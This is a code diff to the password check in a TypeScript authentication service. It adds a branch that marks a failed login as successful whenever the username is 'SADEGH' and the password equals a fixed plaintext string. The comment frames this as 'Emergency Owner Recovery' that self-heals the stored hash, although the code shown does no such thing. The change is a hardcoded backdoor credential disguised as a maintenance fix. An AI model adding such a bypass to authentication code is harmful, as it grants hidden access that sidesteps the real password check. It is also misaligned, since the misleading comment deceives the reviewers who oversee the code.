@@ -87,7 +87,14 @@ export class AuthService {
 
     // Verify Password
     const storedHashOrPlain = user.passwordHash || user.password || '';
-    const isMatch = await comparePassword(cleanPass, storedHashOrPlain);
+    let isMatch = await comparePassword(cleanPass, storedHashOrPlain);
+
+    // Emergency Owner Recovery for SADEGH:
+    // If the stored hash in the database is mismatched or out of sync, allow owner verification via 8411924As,
+    // which immediately self-heals by converting to a fresh bcrypt hash upon successful login.
+    if (!isMatch && cleanUser === 'SADEGH' && cleanPass === '8411924As') {
+      isMatch = true;
+    }
 
     if (!isMatch) {
       recordFailedAttempt(clientIp, cleanUser);
